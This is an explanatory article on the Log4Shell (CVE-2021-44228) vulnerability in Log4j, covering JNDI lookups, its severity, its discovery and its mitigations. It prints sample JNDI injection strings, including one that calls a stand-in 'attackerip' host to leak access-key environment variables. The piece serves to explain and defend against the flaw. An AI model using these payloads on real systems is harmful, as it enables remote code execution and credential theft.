# How did the Log4j vulnerability become the threat that it was?


## What is Log4j?
Log4J is a widely used open source java logging library originally written by Ceki Gülcü. It is used in most moderately sized Java projects. It can be used to track thing like error messages or debug messages, which are then stored or *logged*. Apache describes Log4J as follows:
> log4j is a tool to help the programmer output log statements to a variety of output targets.In case of problems with an application, it is helpful to enable logging so that the problem can be located. With log4j it is possible to enable logging at runtime without modifying the application binary. The log4j package is designed so that log statements can remain in shipped code without incurring a high performance cost. It follows that the speed of logging (or rather not logging) is capital.

> log4j is designed with three goals in mind: reliability, speed and flexibility. There is a tight balance between these requirements. We believe that log4j strikes the right balance.




## Why is Log4shell a big deal?
Log4shell (CVE-2021-44228) is a nickname for an severe vulnerability in Log4J. The vulnerability has existed since 2013, and was only "discovered" and privately disclosed to the [Apache Software Foundation](https://en.wikipedia.org/wiki/The_Apache_Software_Foundation) on 24 November 2021. According to the Common Vulnerability Scoring System ([CVSS](https://nvd.nist.gov/vuln-metrics/cvss)) this vulnerability scores a 10/10 for it's severity. This is because this vulnerability enables Remote Code Execution (RCE). Which allows hackers to be able to run any code on your machine. This is also why it is called Log4Shell, because it's almost like anyone can open a [Shell](https://datacarpentry.org/shell-genomics/01-introduction/) on any server that uses Log4J.

According to Snyk, an open source security platform, 60.8% of java projects that use Log4J use it indirectly. Which means that the project has libraries that in turn use Log4J. So even developers that can't directly see that they are using Log4J aren't safe from the vulnerability.
![image](https://user-images.githubusercontent.com/77112006/147350753-63dac8cd-8d3b-4244-ade5-ea239dde1b3c.png)
source: https://snyk.io/blog/log4j-vulnerability-software-supply-chain-security-log4shell/

## How does Log4shell work?
There are several factors, which together are responsible for the vulnerability. So first we'll have a look at some features wihtin Log4j and java, and then we'll illustrate how the vulnerability works.

### Logging expressions
Log4j allows developers to log expressions. See the code below
```java
logger.info("{} has logged in using id {}", map.get("Name"), user.getId());
```
In this example you're logging a string. And you're plugging the value that gets returned from ```map.get("Name")``` and ```user.getId()``` into that string. On itself, this isn't a problem.

### JNDI
Java Naming and Directory Interface (JNDI) is a java feature that allows distributed applications to look up services in an abstract, resource-independent way. Allowing a developer to store java objects somewhere, and then serialize them to their JVM. This is the way that distributed java application used to work, but this way of distributing has fallen out of fashion some time ago. Nevertheless, this features still remains in java today.

### JNDI lookup while logging expressions
In 2013, a cotributer made a change to Log4j that allowed the developer to do the above described JNDI lookups in a log message. making the code below possible
```java
logger.info("{} has logged in using id {}", "${jndi:ldap://logconfig/example/name}", user.getId());
```
The code above is the vulnerability. Let's say a vulnerable application logs a users input. A user could then input a string like ```${jndi:ldap://myserver/malicious_code}```. Log4J will see this and try to look up this JNDI. Which would then introduce a malicious java object into the JVM.  

## How did Log4Shell get discovered?
According to [this source](https://www.npr.org/2021/12/14/1064123144/companies-scramble-to-defend-against-newly-discovered-log4j-digital-flaw?t=1640603508585) A researcher working for Chinese tech firm Alibaba discovered the bug and privately informed the Apache Software Foundation. It accidentally went public after the popular word building video game Minecraft made its disclosure and the researcher posted about it online. 


## What are the potential fixes for severe vulnerabilities like Log4Shell?
First of all, the are some simple mitigations which can stop some of the damage being done to your application. The first one is to disable lookups by setting the following flags to false.
```
com.sun.jndi.ldap.object.trustURLCodebase
com.sun.jdni.rmi.object.trustURLCodebase
```
This however won't stop your application from actually making the call. It only stops the contents of that call from doing anything. This still enables hackers to make your application leak it's environment variables, like in the code below:
```java
${jndi:ldap://attackerip/exploit/${env:ACCES_KEY_ID}/${env:SECRET_ACCES_KEY}}
```
A more definitive way of fixing the vulnerability is to  update log4j to version 2.16 or above. This can be rather difficult, since an application can have dependencies on things, which then have dependencies on Log4j. You would either have to wait for that dependency to publish an update, or if you're using gradle, you could use a function called dependency constraints.
Another way that some companies used to fix it is to directly patch it. Which may be the eassiest option in some cases.





![image](https://user-images.githubusercontent.com/77112006/147350117-701b817a-cda4-412c-b85e-89865f4fa72d.png)

## How did affected developers deal with it?
After the news of this exploit was made public, virtually every tech companies number one priotity was to find a way to fix it within their software, before any hacker could exploit it. The Washington post stated 
> At Google alone, more than 500 engineers had been going through reams and reams of code to make sure it was safe, according to one employee.




Sources:
- [Log4J Vulnerability (Log4Shell) Explained - for Java developers. (2021, 16 december). [Video]. YouTube.](https://www.youtube.com/watch?v=uyq8yxWO1ls&t=1037s&ab_channel=JavaBrains)
- [Tal, L. (2021, 20 december). The Log4j vulnerability and its impact on software supply chain security. Snyk. Geraadpleegd op 24 december 2021](https://snyk.io/blog/log4j-vulnerability-software-supply-chain-security-log4shell/)
- [Apache log4j 1.2 - Frequently Asked Technical Questions. (z.d.). Apache. Geraadpleegd op 24 december 2021]( https://logging.apache.org/log4j/1.2/faq.html)
-  [Yan, Tao; Deng, Qi; Zhang, Haozhe; Fu, Yu; Grunzweig, Josh (10 December 2021). "Another Apache Log4j Vulnerability Is Actively Exploited in the Wild (CVE-2021-44228)".](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/)
-  [NVD - Vulnerability Metrics. (z.d.). NVD. Geraadpleegd op 24 december 2021](https://nvd.nist.gov/vuln-metrics/cvss)
-  [What is JNDI? What is its basic use? When is it used? (2010, 6 december). Stack Overflow. Geraadpleegd op 27 december 2021](https://stackoverflow.com/questions/4365621/what-is-jndi-what-is-its-basic-use-when-is-it-used)
-  [Hunter, T., & De Vynck, G. (2021, 20 december). The ‘most serious’ security breach ever is unfolding right now. Here’s what you need to know. Washington Post. Geraadpleegd op 27 december 2021](https://www.washingtonpost.com/technology/2021/12/20/log4j-hack-vulnerability-java/#LSWMB3XKYRALRAPBVQHPTFUQSI)
